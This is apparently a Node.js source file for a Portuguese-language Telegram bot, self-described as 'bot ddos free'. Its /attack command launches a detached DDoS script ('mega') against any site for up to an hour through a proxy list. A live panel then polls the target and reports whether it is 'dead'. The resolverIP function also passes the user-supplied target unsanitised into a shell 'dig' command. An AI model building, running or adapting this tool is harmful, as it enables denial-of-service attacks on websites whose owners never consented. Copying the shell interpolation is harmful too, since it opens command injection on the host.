const { Telegraf } = require('telegraf');
const { spawn, exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const https = require('https');
const http = require('http');


const BOT_TOKEN = 'seutokenaq';

const bot = new Telegraf(BOT_TOKEN);


function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function gerarBarra(porcentagem, tamanho = 10) {
    const preenchido = Math.round((porcentagem / 100) * tamanho);
    const vazio = tamanho - preenchido;
    return `[${'█'.repeat(preenchido)}${'░'.repeat(vazio)}]`;
}

function resolverIP(host) {
    return new Promise((resolve) => {
        const hostname = host.replace(/^https?:\/\//, '').split('/')[0];
        exec(`dig +short ${hostname} | head -1`, (error, stdout) => {
            resolve(error || !stdout.trim() ? 'N/A' : stdout.trim());
        });
    });
}

function checarAlvo(target) {
    return new Promise((resolve) => {
        const url = target.startsWith('http') ? target : `https://${target}`;
        const lib = url.startsWith('https') ? https : http;
        
        const req = lib.get(url, { timeout: 5000 }, (res) => {
            if (res.statusCode >= 200 && res.statusCode < 400) {
                resolve(`🟢 ONLINE (${res.statusCode})`);
            } else {
                resolve(`🔴 MORTO (HTTP ${res.statusCode})`);
            }
            req.destroy();
        });
        
        req.on('error', (err) => {
            if (err.code === 'ETIMEDOUT' || err.code === 'ESOCKETTIMEDOUT') {
                resolve('💀 MORTO (Timeout)');
            } else if (err.code === 'ECONNREFUSED') {
                resolve('💀 MORTO (Conexão Recusada)');
            } else {
                resolve(`❌ ERRO (${err.code || 'Desconhecido'})`);
            }
        });
        
        req.on('timeout', () => {
            req.destroy();
            resolve('💀 MORTO (Timeout)');
        });
    });
}


async function iniciarPainelAtaque(ctx, alvo, tempo, msgId) {
    const chatId = ctx.chat.id;
    const startTime = Date.now();
    const ipAlvo = await resolverIP(alvo);
    
    
    const loop = setInterval(async () => {
        const decorrido = Math.floor((Date.now() - startTime) / 1000);
        const restante = Math.max(0, tempo - decorrido);
        const pct = Math.min(100, Math.floor((decorrido / tempo) * 100));
        const barra = gerarBarra(pct);
        
        const statusTxt = await checarAlvo(alvo);
        
        const texto = 
            `🚀 <b>MONITOR DE ATAQUE</b>\n\n` +
            `🎯 <b>Alvo:</b> <code>${alvo}</code>\n` +
            `📡 <b>IP:</b> <code>${ipAlvo}</code>\n` +
            `⏱️ <b>Time:</b> ${tempo}s\n` +
            `📉 <b>Restam:</b> ${restante}s\n` +
            `📊 <b>Status:</b> ${statusTxt}\n\n` +
            `<b>Progresso:</b>\n` +
            `<code>${barra} ${pct}%</code>`;
        
        try {
            await ctx.telegram.editMessageText(chatId, msgId, null, texto, { parse_mode: 'HTML' });
        } catch (err) {
            
        }
        
        if (restante <= 0) {
            clearInterval(loop);
            try {
                await ctx.telegram.sendMessage(chatId, `⏹️ <b>Ataque finalizado</b> contra <code>${alvo}</code>`, { parse_mode: 'HTML' });
            } catch (e) {}
        }
    }, 3000);
}


bot.command('attack', async (ctx) => {
    try {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) {
            return ctx.reply('⚠️ Uso correto: /attack site.com 120');
        }
        
        const alvo = args[1];
        const tempo = parseInt(args[2]);
        
        if (isNaN(tempo) || tempo < 1 || tempo > 3600) {
            return ctx.reply('⚠️ O tempo deve ser um número entre 1 e 3600.');
        }
        
        
        if (!fs.existsSync('./mega')) {
            return ctx.reply('❌ Erro: O arquivo mega.js não foi encontrado nesta pasta.');
        }
        
        
        if (!fs.existsSync('./proxy.txt')) {
            fs.writeFileSync('./proxy.txt', '');
        }
        
        
        const scriptPath = require('path').resolve('./');
        const proxyPath = require('path').resolve('./proxy.txt');
        const comandoArgs = [scriptPath, alvo, tempo.toString(), '2', '1', proxyPath];
        
        console.log('▶️ Executando: node ' + comandoArgs.join(' '));
        
        
        const proc = spawn('node', comandoArgs, {
            stdio: 'ignore',
            detached: true
        });
        proc.unref();
        
        
        const msg = await ctx.replyWithHTML(
            `⏳ <b>Iniciando ataque contra</b> <code>${alvo}</code>...\nAguarde o painel de progresso.`
        );
        
        
        iniciarPainelAtaque(ctx, alvo, tempo, msg.message_id);
        
    } catch (err) {
        ctx.reply('❌ Erro interno: ' + err.message);
    }
});


bot.command('st', async (ctx) => {
    try {
        const cpus = os.cpus().length;
        const load = os.loadavg()[0]; 
        const cpuPct = Math.min(100, (load / cpus) * 100).toFixed(1);
        
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const usedMem = totalMem - freeMem;
        const memPct = ((usedMem / totalMem) * 100).toFixed(1);
        
        
        exec("df -k / | tail -1 | awk '{print $2, $3, $4, $5}'", (err, stdout) => {
            let discoTotal = 0, discoUsado = 0, discoPct = 0;
            if (!err && stdout) {
                const parts = stdout.trim().split(/\s+/);
                if (parts.length >= 4) {
                    discoTotal = parseInt(parts[0]) * 1024;
                    discoUsado = parseInt(parts[1]) * 1024;
                    discoPct = parseInt(parts[3].replace('%', ''));
                }
            }
            
            const texto = 
                `🖥️ <b>STATUS DA VPS</b>\n\n` +
                `🧠 <b>RAM</b> (${memPct}%)\n` +
                `├ Usada: ${formatBytes(usedMem)} / ${formatBytes(totalMem)}\n` +
                `└ <code>${gerarBarra(memPct)}</code>\n\n` +
                `⚙️ <b>CPU</b> (${cpus} núcleos)\n` +
                `├ Carga: ${cpuPct}%\n` +
                `└ <code>${gerarBarra(cpuPct)}</code>\n\n` +
                `💾 <b>Armazenamento</b> (${discoPct}%)\n` +
                `├ Usado: ${formatBytes(discoUsado)} / ${formatBytes(discoTotal)}\n` +
                `└ <code>${gerarBarra(discoPct)}</code>`;
                
            ctx.replyWithHTML(texto).catch(() => {});
        });
    } catch (err) {
        ctx.reply('❌ Erro ao ler status: ' + err.message);
    }
});


bot.launch().then(() => {
    console.log('=======================================');
    console.log('🤖 bot ddos free');
    console.log('=======================================');
    console.log('Comandos:');
    console.log('/attack site.com 120');
    console.log('/st');
    console.log('=======================================');
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
